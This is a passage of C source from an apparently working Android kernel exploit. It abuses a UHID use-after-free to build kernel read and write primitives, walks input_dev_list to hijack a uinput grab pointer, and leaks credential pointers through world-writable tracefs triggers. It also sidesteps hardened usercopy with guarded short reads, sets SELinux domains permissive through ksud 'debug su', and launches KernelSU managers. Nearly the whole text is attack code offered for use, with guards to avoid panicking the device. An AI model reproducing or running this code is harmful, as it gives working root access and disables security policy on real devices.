    { "org.rouyashiki.yukisu", "org.rouyashiki.yukisu/org.rouyashiki.yukisu.ui.MainActivity" },
    { "com.sukisu.nova", "com.sukisu.nova/com.sukisu.nova.ui.jtrncdxzsyqActivity" },
};

static const char *ksu_known_activity(void) {
    for (unsigned i = 0;
         i < sizeof(g_manager_activities) / sizeof(g_manager_activities[0]);
         i++)
        if (!strcmp(g_manager_activities[i].pkg, g_prof.ksu_manager))
            return g_manager_activities[i].activity;
    return NULL;
}

static int g_launch_resolve;

static int ksu_launch_manager(void) {
    char cmd[640], out[640], *nl;
    const char *known = g_launch_resolve ? NULL : ksu_known_activity();
    char *av[4];

    if (known) {
        snprintf(cmd, sizeof(cmd), "am start -n '%s' >/dev/null 2>&1", known);
        av[0] = (char *)"/system/bin/sh";
        av[1] = (char *)"-c";
        av[2] = cmd;
        av[3] = NULL;
        return ksu_run_capture(av, out, sizeof(out));
    }
    snprintf(cmd, sizeof(cmd),
             "cmd package resolve-activity --brief '%s' 2>/dev/null | "
             "grep '/' | tail -n 1",
             g_prof.ksu_manager);
    av[0] = (char *)"/system/bin/sh";
    av[1] = (char *)"-c";
    av[2] = cmd;
    av[3] = NULL;
    out[0] = 0;
    if (ksu_run_capture(av, out, sizeof(out)) != 0)
        return -1;
    nl = strchr(out, '\n');
    if (nl)
        *nl = 0;
    if (!strchr(out, '/'))
        return -1;
    snprintf(cmd, sizeof(cmd), "am start -n '%s' >/dev/null 2>&1", out);
    return ksu_run_capture(av, out, sizeof(out));
}

/* VENDOR-SPECIFIC: sys.boot_completed tells us whether KSU's injected
 * policy already broke the vendor HAL bring-up (port switch, see
 * hal_patch_enable/hal_patch_domains in the profile). */
static int boot_completed_now(void) {
    char b[16] = "";
    FILE *f = popen("getprop sys.boot_completed 2>/dev/null", "r");

    if (f) {
        if (!fgets(b, sizeof(b), f))
            b[0] = 0;
        pclose(f);
    }
    return strstr(b, "1") != NULL;
}

/* Vendor HAL policy repair, run by the uid-2000 helper. */
static int ksu_patch_main(void) {
    char cmd[1024];
    char patch[320] = "";
    char *av[4];
    char out[4096];
    int rc;

    ksu_derive_kmi();
    if (ksu_locate_ksud() != 0)
        return 1;
    /* VENDOR-SPECIFIC: the vendor HAL domains are a runtime/per-profile
     * property.  Patch only when boot_completed is still 0 after the module
     * went Live; the App can disable it outright with hal_patch_enable=0. */
    if (HAL_PATCH_ENABLE && !boot_completed_now()) {
        snprintf(patch, sizeof(patch), " sepolicy patch 'permissive { %s }'",
                 HAL_PATCH_DOMAINS);
        printf("[*] hal_patch=1 domains=\"%s\" (boot_completed!=1)\n",
               HAL_PATCH_DOMAINS);
    } else {
        printf("[*] hal_patch=0\n");
    }
    snprintf(cmd, sizeof(cmd),
             "printf \"%%s%s\\necho 1 > /sys/fs/selinux/enforce\\n"
             "getenforce\\nid\\n\" '%s' | '%s' debug su",
             patch, g_ksud_lib, g_ksud_lib);
    av[0] = (char *)"/system/bin/sh";
    av[1] = (char *)"-c";
    av[2] = cmd;
    av[3] = NULL;
    out[0] = 0;
    rc = ksu_run_capture(av, out, sizeof(out));
    printf("[*] policy patch rc=%d\n", rc);
    if (out[0])
        printf("%s", out);
    {
        int old_pid = ksu_manager_pid();
        int launched = 0;

        for (int i = 0; i < 25; i++) {
            int np;

            if (i == 0 || i % 5 == 4) {
                if (ksu_launch_manager() == 0)
                    launched++;
                /* The obfuscated component names change between manager
                 * releases; after two launches that brought up nothing,
                 * fall back to resolving the launcher once. */
                if (launched >= 2 && ksu_manager_pid() <= 0)
                    g_launch_resolve = 1;
            }
            usleep(200000);
            np = ksu_manager_pid();
            if (np > 0 && np != old_pid)
                break;
        }
        printf("[*] manager pid %d -> %d (launch calls=%d)\n", old_pid,
               ksu_manager_pid(), launched);
    }
    {
        const char *t0s = getenv("CVE99491_T0");
        long t0 = t0s ? strtol(t0s, NULL, 0) : 0;

        if (t0 > 0)
            printf("[+] TOTAL_SECONDS=%.1f\n", (now_ms() - t0) / 1000.0);
    }
    return rc == 0 ? 0 : 1;
}

/* Fork that helper before the exploit touches anything.  It inherits no
 * uhid/spray descriptors because none exist yet, and it keeps the calling
 * uid for the rest of the run. */
static int ksu_spawn_patch_helper(void) {
    int p[2];
    pid_t pid;
    char b[32];

    if (pipe(p) != 0)
        return -1;
    pid = fork();
    if (pid == 0) {
        char c;

        close(p[1]);
        dup2(p[0], 0);
        if (p[0] > 0)
            close(p[0]);
        signal(SIGHUP, SIG_IGN);
        signal(SIGTERM, SIG_IGN);
        signal(SIGINT, SIG_IGN);
        for (;;) {
            struct pollfd pfd = { .fd = 0, .events = POLLIN };
            int pr = poll(&pfd, 1, 180000);
            ssize_t n;

            if (pr <= 0)
                _exit(1);
            n = read(0, &c, 1);
            if (n == 1)
                break;
            if (n < 0 && errno == EINTR)
                continue;
            _exit(1);
        }
        _exit(ksu_patch_main() == 0 ? 0 : 1);
    }
    close(p[0]);
    if (pid < 0) {
        close(p[1]);
        return -1;
    }
    g_patch_w = p[1];
    snprintf(b, sizeof(b), "%d", g_patch_w);
    setenv("CVE99491_PATCH_FD", b, 1);
    snprintf(b, sizeof(b), "%d", (int)pid);
    setenv("CVE99491_PATCH_PID", b, 1);
    return 0;
}

/*
 * Stop a run that has already armed the outq: exiting would let
 * uhid_char_release() kfree() whatever outq[0] points at.  Fork a holder
 * that records PARKED and keeps the uhid fds; the parent exits so the adb
 * shell returns and the holder stays parked until the next reboot.
 */
static void abort_armed_and_park(const char *why)
    __attribute__((noreturn));
static void abort_armed_and_park(const char *why) {
    pid_t pid;

    printf("[-] %s\n", why);
    printf("PARKED\n");
    PLOG("armed failure: %s\n", why);
    fflush(NULL);
    oracle_shutdown();
    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);

    pid = fork();
    if (pid == 0)
        park_holder();
    if (pid > 0)
        _exit(1);

    /* fork failed: keep the fds in this process rather than risk the
     * release path; the shell will wait for the timeout. */
    park_holder();
}

/* --- one fire run per boot ---------------------------------------- */
/*
 * A second fire run on the same boot reuses slab state left by the first
 * one (freed 2k slots, stale chains) and is the easiest way to panic the
 * device.  Borrowed from CVE-2026-98260's lifecycle.h: leave a boot_id
 * marker and refuse to fire again until the device has rebooted.
 *
 * The same helper also consults the PARKED marker: a boot that still holds
 * an armed anchor refuses immediately.  PARKED itself is recorded right
 * before the first fire and again by every armed holder, so a run that
 * dies after arming still blocks the rest of the boot.  --force-fire
 * bypasses only the boot_id half; a PARKED boot always refuses.
 */
static int g_force_fire;
static int g_no_ksu;

static int read_boot_id(char *out, size_t cap) {
    int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
    ssize_t n;
    if (fd < 0)
        return -1;
    n = read(fd, out, cap - 1);
    close(fd);
    if (n <= 0)
        return -1;
    while (n > 0 && (out[n - 1] == '\n' || out[n - 1] == '\r' ||
                     out[n - 1] == ' '))
        n--;
    out[n] = 0;
    return 0;
}

/* 0 = clear to fire, 1 = this boot already fired, 3 = PARKED. */
static int fire_guard(void) {
    char cur[64], old[64];
    ssize_t m;
    int fd;
    int fired = 0;

    if (cve99491_parked_same_boot_in(g_run_dir)) {
        fprintf(stderr, "[-] PARKED: this boot already holds an anchor; "
                "reboot before another run\n");
        printf("PARKED\n");
        return 3;
    }
    if (read_boot_id(cur, sizeof(cur)) == 0) {
        fd = open(g_run_bootid, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) {
            m = read(fd, old, sizeof(old) - 1);
            close(fd);
            if (m > 0) {
                old[m] = 0;
                fired = strcmp(old, cur) == 0;
            }
        }
        if (fired && !g_force_fire) {
            printf("[-] boot %s already ran a fire run\n", cur);
            printf("[-] reboot before retrying (or pass --force-fire)\n");
            return 1;
        }
        if (fired)
            printf("[!] boot %s already fired; --force-fire\n", cur);
        /* record this boot before arming anything */
        fd = open(g_run_bootid, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd >= 0) {
            (void)!write(fd, cur, strlen(cur));
            close(fd);
        }
    }
    return 0;
}

/* Kernel enforcement state as selinuxfs reports it: 0 permissive,
 * 1 enforcing, -1 when the file cannot be read. */
static int selinux_enforce_now(void) {
    char b[8];
    ssize_t n;
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return -1;
    n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0)
        return -1;
    b[n] = 0;
    return b[0] == '0' ? 0 : 1;
}

/*
 * Best-effort enforcing restore for a failure after a permissive window was
 * opened.  The write is always safe for the chain state (it touches no
 * outq/cred memory), but the process may still carry its pre-swap
 * real_cred: copy_creds() derives fork children from real_cred, so a
 * swap-only mode's parent can lack the uid/caps needed to write selinuxfs.
 * In that case the mode-specific loader child owns the authoritative
 * restore; this attempt is only a safety net and is logged.
 */
static int restore_enforcing_try(void) {
    int fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
    ssize_t wr = -1;

    if (fd >= 0) {
        wr = write(fd, "1", 1);
        close(fd);
    }
    printf("[*] enforce restore attempt: write=%zd now=%d\n", wr,
           selinux_enforce_now());
    PLOG("enforce restore attempt write=%zd now=%d\n", wr,
         selinux_enforce_now());
    return wr == 1 && selinux_enforce_now() == 1 ? 0 : -1;
}

static void restore_enforcing_and_park(const char *why)
    __attribute__((noreturn));
static void restore_enforcing_and_park(const char *why) {
    (void)restore_enforcing_try();
    abort_armed_and_park(why);
}

/*
 * Retarget the read anchor at tgt and read its first 64 bytes.  A missed
 * chain write leaves outq[0] on the previous target, so the previous
 * window repeats verbatim and is treated as a miss; `prev` is only
 * updated by the caller after it accepts the read.
 */
static int pchain_read64(struct pchain *pc, unsigned long long tgt,
                         unsigned char *prev, unsigned char *out,
                         long spray_n) {
    for (int i = 0; i < 6; i++) {
        if (pc_write(pc, pc->base + UHID_OUTQ_OFF - 2, (unsigned)(tgt & 0xffff),
                     (int)((tgt >> 16) & 0xffffffff), spray_n) < 0)
            return -1;
        if (outq_read(pc->a, out, 4096) != 0)
            continue;
        if (memcmp(out, prev, 64) != 0)
            return 0;
    }
    return -1;
}

/* --- input_dev_list walk to the uinput trigger ------------------------ */

static unsigned long long ld64(const unsigned char *p) {
    unsigned long long v;

    memcpy(&v, p, 8);
    return v;
}

static unsigned short ld16(const unsigned char *p) {
    unsigned short v;

    memcpy(&v, p, 2);
    return v;
}

/*
 * Hardened usercopy rejects a copy_to_user() whose source is a slab
 * object outside that cache's usercopy whitelist.  The task_struct cache
 * only whitelists thread_struct, so "read task->files" through the outq
 * is impossible (usercopy_abort).  Slab reads therefore use a short
 * guarded copy: the destination ends n bytes before a PROT_NONE page and
 * the read count is n+1, so the kernel still takes the EFAULT path (no
 * kfree of the target) while the usercopy check only sees n+1 bytes.
 */
static unsigned char *g_short_page;

static int short_page_setup(void) {
    if (g_short_page)
        return 0;
    g_short_page = mmap(NULL, 8192, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_short_page == MAP_FAILED || !g_short_page) {
        g_short_page = NULL;
        return -1;
    }
    if (mprotect(g_short_page + 4096, 4096, PROT_NONE) != 0)
        return -1;
    return 0;
}

static int outq_read_n(struct anchor *a, unsigned char *out, size_t n) {
    unsigned char *dst;
    ssize_t r;

    if (n == 0 || n > 4096 || short_page_setup() < 0)
        return -1;
    dst = g_short_page + 4096 - n;
    errno = 0;
    r = read(a->fd, dst, n + 1);
    if (r >= 0) {
        /* The kernel freed outq[0]; the target slot is gone. */
        PLOG("short read completed n=%zu\n", n);
        return -1;
    }
    if (errno == EAGAIN)
        return 1;
    if (errno != EFAULT)
        return -1;
    memcpy(out, dst, n);
    return 0;
}

/* One short target read through the pad chain; stale windows repeat the
 * previous target's first 16 bytes and are retried. */
static int pchain_read_n(struct pchain *pc, unsigned long long tgt,
                         unsigned char *prev, unsigned char *out, size_t n,
                         long spray_n) {
    size_t cmp = n < 16 ? n : 16;

    for (int i = 0; i < 6; i++) {
        if (pc_write(pc, pc->base + UHID_OUTQ_OFF - 2,
                     (unsigned)(tgt & 0xffff),
                     (int)((tgt >> 16) & 0xffffffff), spray_n) < 0)
            return -1;
        if (outq_read_n(pc->a, out, n) != 0)
            continue;
        if (memcmp(out, prev, cmp) != 0)
            return 0;
    }
    return -1;
}

/* uinput-triggered short read: the EV_PWR record at outq-2 installs the
 * target pointer exactly like pc_write(), then the guarded copy reads it.
 * No pad trigger and no reclaim. */
static int uchain_read(struct pchain *pc, unsigned long long tgt,
                       unsigned char *prev, unsigned char *out, size_t n) {
    size_t cmp = n < 16 ? n : 16;

    for (int i = 0; i < 6; i++) {
        if (uchain_re(pc, pc->base + UHID_OUTQ_OFF - 2, EV_PWR,
                      (unsigned)(tgt & 0xffff),
                      (int)((tgt >> 16) & 0xffffffff)) < 0)
            return -1;
        if (outq_read_n(pc->a, out, n) != 0)
            continue;
        if (memcmp(out, prev, cmp) != 0)
            return 0;
    }
    return -1;
}

/* Static/per-cpu reads after the uinput trigger is armed: no reclaim.
 * Any uinput-chain failure disables it and falls back to the pad chain. */
static int read_static(struct pchain *pc, unsigned long long tgt,
                       unsigned char *prev, unsigned char *out, size_t n,
                       long spray_n) {
    if (g_uchain) {
        for (int t = 0; t < 3; t++) {
            if (uchain_read(pc, tgt, prev, out, n) == 0)
                return 0;
        }
        PLOG("uchain read miss tgt=%#llx\n", tgt);
        if (g_no_pad_fallback)
            return -1;
        g_uchain = 0;
    }
    return pchain_read64(pc, tgt, prev, out, spray_n);
}

/*
 * The uinput trigger's input_dev sits near the tail of the static
 * input_dev_list.  Walk backwards from head.prev (the pad, registered
 * after the uinput device) and match input_id: bustype=BUS_VIRTUAL,
 * vendor=WACOM_VID, product=0x9941, version=0.  Each device read is a
 * 1600-byte guarded copy, which stays inside kmalloc-2k's usercopy
 * region (2048) and covers both input_id (24) and node (1488).
 */
#define UINPUT_ID_QWORD 0x00009941056a0006ULL

static int find_uinput_dev(struct pchain *pc, unsigned long long slide,
                           long spray_n, unsigned long long *devp) {
    unsigned char prev[16] = { 0 }, buf[4096];
    unsigned long long head = SYM_INPUT_DEV_LIST + slide;
    unsigned long long node;

    if (!is_kptr(head)) {
        PLOG("input_dev_list symbol invalid %#llx\n", head);
        return -1;
    }
    if (pchain_read_n(pc, head, prev, buf, 16, spray_n) < 0) {
        PLOG("input_dev_list head read failed\n");
        return -1;
    }
    memcpy(prev, buf, 16);
    node = ld64(buf + 8);              /* head.prev = newest device */
    for (int hop = 0; hop < 8; hop++) {
        unsigned long long dev;

        if (!is_kptr(node) || (node & 7)) {
            PLOG("input_dev_list node invalid %#llx\n", node);
            return -1;
        }
        if (node == head)
            break;
        dev = node - IDEV_NODE_OFF;
        if (pchain_read_n(pc, dev, prev, buf, 1600, spray_n) < 0) {
            PLOG("input_dev read failed hop=%d dev=%#llx\n", hop, dev);
            return -1;
        }
        memcpy(prev, buf, 16);
        PLOG("input_dev hop=%d dev=%#llx id=%04x:%04x:%04x:%04x\n", hop,
             dev, ld16(buf + IDEV_ID_OFF),
             ld16(buf + IDEV_ID_OFF + 2), ld16(buf + IDEV_ID_OFF + 4),
             ld16(buf + IDEV_ID_OFF + 6));
        if (ld64(buf + IDEV_ID_OFF) == UINPUT_ID_QWORD) {
            *devp = dev;
            printf("[+] uinput dev %#llx (list hop %d)\n", dev, hop + 1);
            PLOG("uinput dev=%#llx hop=%d\n", dev, hop + 1);
            return 0;
        }
        node = ld64(buf + IDEV_NODE_OFF + 8); /* node.prev */
    }
    return -1;
}

/*
 * Point the uinput input_dev's grab at the anchor's fake handle.  Two
 * EV_ABS stores (low/high half) are enough; both still run through the
 * pad chain, and the result is read back before the uinput trigger is
 * trusted.  No event is injected into the uinput device between the two
 * halves, so the intermediate pointer is never dereferenced.
 */
static int uchain_setup(struct pchain *pc, unsigned long long slide,
                        long spray_n) {
    unsigned long long dev = 0, h = pc->base + UHID_DATA_OFF + C_OFF_H;
    unsigned char prev[16], buf[4096];
    int i, ok = 0;

    if (find_uinput_dev(pc, slide, spray_n, &dev) < 0)
        return -1;
    for (i = 0; i < 3 && !ok; i++) {
        if (pchain_re(pc, dev + IDEV_GRAB_OFF, EV_ABS, 0,
                      (int)(unsigned)h, spray_n) < 0)
            break;
        spray_drain();
        if (pchain_re(pc, dev + IDEV_GRAB_OFF + 4, EV_ABS, 0,
                      (int)(unsigned)(h >> 32), spray_n) < 0)
            break;
        spray_drain();
        memset(prev, 0xAA, sizeof(prev));
        if (pchain_read_n(pc, dev + IDEV_GRAB_OFF, prev, buf, 64,
                          spray_n) == 0) {
            unsigned long long got = ld64(buf);

            PLOG("grab try %d got=%#llx want=%#llx\n", i + 1, got, h);
            if (got == h)
                ok = 1;
        }
    }
    if (!ok) {
        printf("[!] uinput grab setup failed; pad chain fallback\n");
        PLOG("uinput grab failed\n");
        return -1;
    }
    printf("[+] uinput trigger armed (grab=%#llx)\n", h);
    PLOG("uinput armed grab=%#llx\n", h);
    return 0;
}

/* --- tracefs cred leak (kmem_cache_alloc raw ring) ------------------- */

static int trace_wr(const char *path, const char *s) {
    int fd = open(path, O_WRONLY);
    if (fd < 0)
        return -1;
    ssize_t n = write(fd, s, strlen(s));
    close(fd);
    return n < 0 ? -1 : 0;
}

static void trace_drain_cpu(int cpu) {
    static unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR_PATH "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}

static void trace_reset(void) {
    int fd = open(TR_PATH "/trace", O_WRONLY | O_TRUNC);
    if (fd >= 0)
        close(fd);
    for (int c = 0; c < 8; c++)
        trace_drain_cpu(c);
}

/* Fire rss_stat so the world-writable trigger enables kmem_cache_alloc. */
static void trace_kick(void) {
    size_t n = 4UL << 20;
    unsigned char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += TR_PAGE)
        p[i] = 1;
    munmap(p, n);
}

static int trace_prepare(void) {
    const char *trig = TR_PATH "/events/kmem/rss_stat/trigger";
    trace_wr(TR_PATH "/tracing_on", "0");
    trace_reset();
    trace_wr(trig, "!enable_event:kmem:kmem_cache_alloc\n");
    if (trace_wr(trig, "enable_event:kmem:kmem_cache_alloc\n") != 0)
        return -1;
    trace_wr(TR_PATH "/tracing_on", "0");
    trace_reset();
    trace_kick();
    usleep(30000);
    trace_wr(TR_PATH "/tracing_on", "0");
    trace_reset();
    return 0;
}

static unsigned trace_u32(const unsigned char *b, size_t o) {
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long trace_u64(const unsigned char *b, size_t o) {
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

/*
 * Scan the raw per-CPU ring for kmem_cache_alloc records whose common_pid
 * matches and whose bytes_req/call_site identify prepare_creds' cred_jar
 * allocation.  The last such record is the cred the exec committed.
 */
static unsigned long long trace_cred_ptr(const unsigned char *b, size_t n,
                                         int pid) {
    unsigned long long last = 0;
    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
        unsigned long long commit = trace_u64(b, base + 8);
        size_t o = base + 16, end = base + 16 + commit;
        if (end > base + TR_PAGE)
            end = base + TR_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = trace_u32(b, o), tl = hdr & 31, td = hdr >> 5;
            size_t total;
            int data = 0;
            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + trace_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + trace_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 40 && p + 56 <= end &&
                (int)trace_u32(b, p + 4) == pid) {
                unsigned long long site = trace_u64(b, p + 8);
                unsigned long long ptr = trace_u64(b, p + 16);
                /* 6.18 kmem_cache_alloc: call_site,ptr,__data_loc name,
                 * pad, bytes_req@p+32；kmalloc: bytes_req@p+24。 */
                unsigned long long req_a = trace_u64(b, p + 32);
                unsigned long long req_b = trace_u64(b, p + 24);

                if ((site >> 48) == 0xffff &&
                    (req_a == CRED_REQ || req_b == CRED_REQ))
                    last = ptr;
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    return last;
}

/* Debug helper: dump kfree/kmalloc records with bytes_req == cred_jar size,
 * so the correct call-site low21 can be read off the device instead of
 * trusting another build's +0x2c offset. */
static void trace_dump_cred_recs(const unsigned char *b, size_t n, int pid) {
    int shown = 0, all = 0, data_n = 0;

    fprintf(stderr, "[dbg] credleak ring bytes=%zu\n", n);
    if (n >= 64) {
        fprintf(stderr, "[dbg] page0:");
        for (int i = 0; i < 64; i++)
            fprintf(stderr, " %02x", b[i]);
        fprintf(stderr, "\n");
    }
    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
        unsigned long long commit = trace_u64(b, base + 8);
        size_t o = base + 16, end = base + 16 + commit;

        if (end > base + TR_PAGE)
            end = base + TR_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = trace_u32(b, o), tl = hdr & 31, td = hdr >> 5;
            size_t total, p;
            int data = 0;

            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + trace_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + trace_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            p = o + (tl == 0 ? 8 : 4);
            all++;
            if (data && total >= 40 && p + 56 <= end) {
                int rpid = (int)trace_u32(b, p + 4);
                unsigned long long site = trace_u64(b, p + 8);
                unsigned long long ptr = trace_u64(b, p + 16);
                unsigned long long req_a = trace_u64(b, p + 32);
                unsigned long long req_b = trace_u64(b, p + 24);

                data_n++;
                if (rpid == pid && shown < 20 &&
                    (req_a <= 0x10000 || req_b <= 0x10000)) {
                    fprintf(stderr, "[dbg] credrec pid=%d reqA=%llu reqB=%llu "
                            "site=%#llx ptr=%#llx\n", rpid, req_a, req_b,
                            site, ptr);
                    shown++;
                }
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    fprintf(stderr, "[dbg] credrec shown=%d all=%d data=%d "
            "(pid=%d req=%llu want_low21=%#llx)\n",
            shown, all, data_n, pid, (unsigned long long)CRED_REQ,
            (unsigned long long)CRED_SITE_LOW21);
}

static long trace_read_cpu(int cpu, unsigned char *buf, size_t cap) {
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR_PATH "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap) {
        ssize_t n = read(fd, buf + tot, cap - tot);
        if (n <= 0)
            break;
        tot += (size_t)n;
    }
    close(fd);
    return (long)tot;
}

/* --- kmem tracepoint oracle probe (non-exploit) ---------------------- */

/* `input_dev` is 1592 bytes on the 117 build, so its kzalloc lands in
 * kmalloc-2k (bytes_alloc=2048).  The probe uses the world-writable
 * rss_stat trigger to enable kmalloc/kmem_cache_alloc, creates a single
 * touch UHID device, and scans the raw ring for that allocation.  It never
 * creates a pad, never triggers the UAF, and writes no RUN/PARKED marker. */
#define TRACE_PROBE_INPUT_REQ 1600

static int trace_probe_event_enable(int enable) {
    const char *trig = TR_PATH "/events/kmem/rss_stat/trigger";
    char *on = (char *)"enable_event:kmem:kmalloc\n";
    char *on2 = (char *)"enable_event:kmem:kmem_cache_alloc\n";
    char *on3 = (char *)"enable_event:kmem:kfree\n";
    char *off = (char *)"!enable_event:kmem:kmalloc\n";
    char *off2 = (char *)"!enable_event:kmem:kmem_cache_alloc\n";
    char *off3 = (char *)"!enable_event:kmem:kfree\n";

    trace_wr(TR_PATH "/tracing_on", "0");
    trace_reset();
    if (enable) {
        trace_wr(trig, off);
        trace_wr(trig, off2);
        trace_wr(trig, off3);
        trace_wr(trig, on);
        trace_wr(trig, on2);
        trace_wr(trig, on3);
        trace_wr(TR_PATH "/tracing_on", "0");
        trace_reset();
        trace_kick();
        usleep(20000);
        trace_wr(TR_PATH "/tracing_on", "0");
        trace_reset();
    } else {
        trace_wr(trig, off);
        trace_wr(trig, off2);
        trace_wr(trig, off3);
        trace_reset();
    }
    return 0;
}

static int trace_probe_scan(const unsigned char *b, size_t n, int cpu) {
    int found = 0;

    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
        unsigned long long commit = trace_u64(b, base + 8);
        size_t o = base + 16, end = base + 16 + commit;

        if (end > base + TR_PAGE)
            end = base + TR_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = trace_u32(b, o), tl = hdr & 31;
            unsigned td = hdr >> 5;
            size_t total;
            int data = 0;

            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + trace_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + trace_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 40 && p + 40 <= end) {
                unsigned long long site = trace_u64(b, p + 8);
                unsigned long long ptr = trace_u64(b, p + 16);
                unsigned long long req = trace_u64(b, p + 24);
                unsigned long long alloc = trace_u64(b, p + 32);

                if (req == TRACE_PROBE_INPUT_REQ && alloc == 2048) {
                    printf("[trace-probe] cpu=%d ptr=%#llx req=%llu alloc=%llu "
                           "site=%#llx\n", cpu, ptr, req, alloc, site);
                    found++;
                }
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    return found;
}

static int trace_probe(void) {
    int fd = uhid_open();
    unsigned char *buf;
    int found = 0;

    if (fd < 0) {
        printf("[trace-probe] result=fail uhid_open\n");
        return 1;
    }
    printf("[trace-probe] input_dev req=%d alloc=2048\n",
           TRACE_PROBE_INPUT_REQ);
    trace_probe_event_enable(1);
    trace_wr(TR_PATH "/tracing_on", "1");
    if (uhid_create(fd, NAME_TOUCH, PHYS_COMMON, 0x1101, rdesc_touch,
                    sizeof(rdesc_touch)) < 0) {
        printf("[trace-probe] result=fail uhid_create\n");
        trace_wr(TR_PATH "/tracing_on", "0");
        trace_probe_event_enable(0);
        close(fd);
        return 1;
    }
    pump_until_start(fd, now_ms() + 2000);
    usleep(100000);
    trace_wr(TR_PATH "/tracing_on", "0");
    buf = malloc(4 << 20);
    if (buf) {
        for (int c = 0; c < 8; c++) {
            long n = trace_read_cpu(c, buf, 4 << 20);

            if (n > 0)
                found += trace_probe_scan(buf, (size_t)n, c);
        }
        free(buf);
    }
    trace_probe_event_enable(0);
    uhid_destroy(fd);
    close(fd);
    printf("[trace-probe] result=%s matches=%d\n", found ? "ok" : "empty",
           found);
    return found ? 0 : 1;
}

/* --- tracefs reclaim oracle ------------------------------------------ */

struct oracle_rec {
    unsigned long long ptr;
    unsigned long long site;
};

static int oracle_collect(const unsigned char *b, size_t n,
                          struct oracle_rec *rec, int max) {
    int found = 0;

    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
        unsigned long long commit = trace_u64(b, base + 8);
        size_t o = base + 16, end = base + 16 + commit;

        if (end > base + TR_PAGE)
            end = base + TR_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = trace_u32(b, o), tl = hdr & 31;
            unsigned td = hdr >> 5;
            size_t total;
            int data = 0;

            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + trace_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + trace_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 40 && p + 40 <= end) {
                unsigned long long ptr = trace_u64(b, p + 16);
                unsigned long long req = trace_u64(b, p + 24);
                unsigned long long alloc = trace_u64(b, p + 32);

                if (req == TRACE_PROBE_INPUT_REQ && alloc == 2048 &&
                    found < max) {
                    rec[found].ptr = ptr;
                    rec[found].site = trace_u64(b, p + 8);
                    found++;
                }
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    return found;
}

/* True if the raw ring has a kmalloc-2k record at `ptr` (allocation of
 * any request size that rounds to 2048, which covers the 1664-byte skb
 * data allocation). */
static int oracle_ptr_present(const unsigned char *b, size_t n,
                              unsigned long long ptr) {
    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
        unsigned long long commit = trace_u64(b, base + 8);
        size_t o = base + 16, end = base + 16 + commit;

        if (end > base + TR_PAGE)
            end = base + TR_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = trace_u32(b, o), tl = hdr & 31;
            unsigned td = hdr >> 5;
            size_t total;
            int data = 0;

            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + trace_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + trace_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 40 && p + 40 <= end &&
                trace_u64(b, p + 16) == ptr &&
                trace_u64(b, p + 32) == 2048 &&
                (!g_prof.spray_skb_req ||
                 trace_u64(b, p + 24) == g_prof.spray_skb_req))
                return 1;
            if (total < 4)
                break;
            o += total;
        }
    }
    return 0;
}

static int oracle_capture_begin(void) {
    trace_probe_event_enable(1);
    if (trace_wr(TR_PATH "/tracing_on", "1") != 0)
        return -1;
    return 0;
}

